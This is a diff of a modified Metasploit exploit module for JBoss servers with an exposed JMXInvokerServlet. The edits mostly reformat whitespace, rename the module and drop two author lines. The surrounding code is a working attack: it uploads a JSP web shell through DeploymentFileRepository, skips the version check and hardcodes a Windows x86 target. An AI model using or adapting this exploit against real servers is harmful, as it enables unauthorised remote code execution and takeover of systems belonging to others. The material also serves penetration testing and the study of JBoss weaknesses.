@@ -11,25 +11,23 @@ class Metasploit4 < Msf::Exploit::Remote
 
   HttpFingerprint = { :pattern => [ /JBoss/ ] }
 
-  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::Remote::HttpClient  
   include Msf::Exploit::EXE
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'        => 'JBoss DeploymentFileRepository WAR Deployment (via JMXInvokerServlet)',
+      'Name'        => 'Scotts JBoss module Mods',
       'Description' => %q{
           This module will upload a standard web shell to the target JBoss servers that have an
         exposed HTTPAdaptor's JMX Invoker exposed on the "JMXInvokerServlet". By invoking
         the methods provided by jboss.admin:DeploymentFileRepository jsp webshell is deployed.
         The DeploymentFileRepository methods seem to work on Jboss 4.x and 5.x and above on 
-		Windows.  This module has been modified from the original to only work on Windows.
+    Windows.  This module has been modified from the original to only work on Windows.
       },
       'Author'      => [
         'Patrick Hof', # Vulnerability discovery, analysis and PoC
         'Jens Liebchen', # Vulnerability discovery, analysis and PoC
         'h0ng10' # Metasploit module
-		'Scott Sutherland' # Shabby module mods
-		'Grisha Kumar' # Shabby module mods
       ],
       'License'     => MSF_LICENSE,
       'References'  =>
@@ -104,7 +102,7 @@ class Metasploit4 < Msf::Exploit::Remote
     #return Exploit::CheckCode::Appears if res.body =~ /SVNTag=JBoss_4_/ # nullbind mod - suppress version check 
     #return Exploit::CheckCode::Appears if res.body =~ /SVNTag=JBoss_5_/ # nullbind mod - suppress version check 
 
-    if res.body =~ /ServletException/	# Simple check, if we caused an exception.
+    if res.body =~ /ServletException/ # Simple check, if we caused an exception.
       vprint_status("Target seems vulnerable, but the used JBoss version is not supported by this exploit")
       return Exploit::CheckCode::Appears
     end
@@ -130,7 +128,7 @@ class Metasploit4 < Msf::Exploit::Remote
     name_parameter = rand_text_alpha(8)
     content_parameter = rand_text_alpha(8)
     stager_uri = "/#{regex_stager_app_base}/#{regex_stager_jsp_name}.jsp"
-    stager_code = "A" * 810		# 810 is the size of the stager in the serialized request
+    stager_code = "A" * 810   # 810 is the size of the stager in the serialized request
 
     replace_values = {
       'regex_app_base' => regex_stager_app_base,
@@ -194,8 +192,8 @@ class Metasploit4 < Msf::Exploit::Remote
     fos = rand_text_alpha(4+rand(4))
     name = rand_text_alpha(4+rand(4))
     file = rand_text_alpha(4+rand(4))
-	
-	# nullbind mod - just included basic jsp webshell code
+  
+  # nullbind mod - just included basic jsp webshell code
     stager_script = <<-EOT
 <%@ page import="java.util.*,java.io.*"%>
 
@@ -303,9 +301,9 @@ EOT
     print_status("Attempting to automatically select a target")
 
     #plat = detect_platform() #nullbind mod - hardcode windows and platform
-	plat = 'win'
+  plat = 'win'
     #arch = detect_architecture() #nullbind mod - hardcode arch as ARCH_x86
-	arch = ARCH_X86
+  arch = ARCH_X86
 
     return nil if (not arch or not plat)
 
